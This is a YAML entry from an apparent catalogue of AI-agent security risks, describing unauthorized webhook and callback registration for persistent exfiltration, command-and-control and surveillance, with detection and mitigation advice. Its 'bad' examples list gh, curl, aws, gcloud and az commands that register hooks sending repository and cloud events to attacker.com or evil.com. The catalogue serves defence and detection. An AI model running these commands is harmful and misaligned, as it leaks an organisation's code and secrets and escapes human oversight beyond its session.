id: "persistence-evasion/agent-config-persistence/webhook-callback-registration"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Agent Config Persistence"
category_id: "6.8"
name: "Unauthorized Webhook and Callback Registration"
risk_level: "high"

abstract: |
  An AI agent registers webhooks, callbacks, or event subscriptions in
  external services (GitHub, GitLab, Slack, cloud platforms) that persist
  beyond the agent session, creating long-lived channels for data
  exfiltration, command-and-control, or unauthorized monitoring.

explanation: |
  Webhooks are HTTP callbacks that external services invoke when events
  occur. Unlike MCP resource subscriptions (which live within the agent
  protocol layer), webhooks are registered directly in external platforms
  and persist independently of the agent session. A compromised agent can
  use CLI tools or APIs to create webhooks that:

  **Persistent data exfiltration**: Register a GitHub webhook that sends
  all push events (including code diffs) to an attacker-controlled endpoint.
  Every subsequent commit across all branches is exfiltrated automatically,
  even after the agent session ends.

  **Credential harvesting**: Create a webhook on a CI/CD pipeline that
  captures environment variables (including secrets) from build events and
  forwards them to an external URL.

  **Command-and-control**: Register a Slack incoming webhook or GitHub
  repository dispatch event that allows an external attacker to trigger
  actions in the organization's infrastructure by sending HTTP requests
  to the webhook URL.

  **Monitoring and surveillance**: Set up cloud event subscriptions
  (AWS EventBridge, GCP Pub/Sub, Azure Event Grid) that forward
  infrastructure events to external endpoints, giving attackers visibility
  into the organization's operations.

  **Why this is distinct from mcp-resource-subscription-abuse**: MCP
  subscriptions are protocol-level and scoped to the MCP session. Webhooks
  are registered in external service APIs and persist indefinitely until
  explicitly removed.

  **Why this is distinct from agentic-tool-registration-persistence**: That
  entry covers an agent registering new tools in its own configuration for
  future sessions. This entry covers registering callbacks in external
  services that independently trigger inbound data to attacker endpoints.

  **Detection difficulty**: Webhook registrations are often low-volume API
  calls that blend with legitimate automation setup. Organizations without
  webhook inventory management may not discover unauthorized webhooks for
  months. GitHub alone supports webhooks at repository, organization, and
  app levels — each with different audit visibility.

recommendation: |
  - AUDIT all webhook/callback creation commands from AI agent sessions.
  - Implement webhook inventory management — maintain a registry of all
    authorized webhooks and alert on new registrations.
  - Restrict agent API tokens to exclude webhook management scopes
    (e.g., GitHub `admin:repo_hook`, `admin:org_hook`).
  - Monitor for `gh api` calls targeting `/hooks`, `/webhooks`, or
    event subscription endpoints.
  - Require human approval for any webhook creation via agent sessions.
  - Implement webhook URL allowlisting — only permit callbacks to
    pre-approved internal endpoints.
  - Periodically audit registered webhooks across all platforms:
    `gh api repos/{owner}/{repo}/hooks`, Slack API, cloud event configs.

examples:
  bad:
    - "gh api repos/org/repo/hooks -X POST -f url=https://attacker.com/collect -f events[]='push'"
    - "curl -X POST -H 'Authorization: Bearer $TOKEN' https://api.github.com/repos/org/repo/hooks -d '{\"url\":\"https://evil.com\",\"events\":[\"push\",\"pull_request\"]}'"
    - "aws events put-rule --name exfil-rule --event-pattern '{\"source\":[\"aws.s3\"]}' && aws events put-targets --rule exfil-rule --targets Id=1,Arn=https://attacker.com/webhook"
    - "gcloud pubsub subscriptions create exfil-sub --topic=projects/corp/topics/builds --push-endpoint=https://attacker.com/collect"
    - "slack webhook create --channel general --url https://hooks.slack.com/services/XXX"
    - "az eventgrid event-subscription create --name backdoor --endpoint https://attacker.com/hook"
  good:
    - "gh api repos/org/repo/hooks  # listing existing webhooks (read-only)"
    - "aws events list-rules  # auditing existing event rules"
    - "gh webhook forward --events push --repo org/repo --url http://localhost:3000  # local dev forwarding"

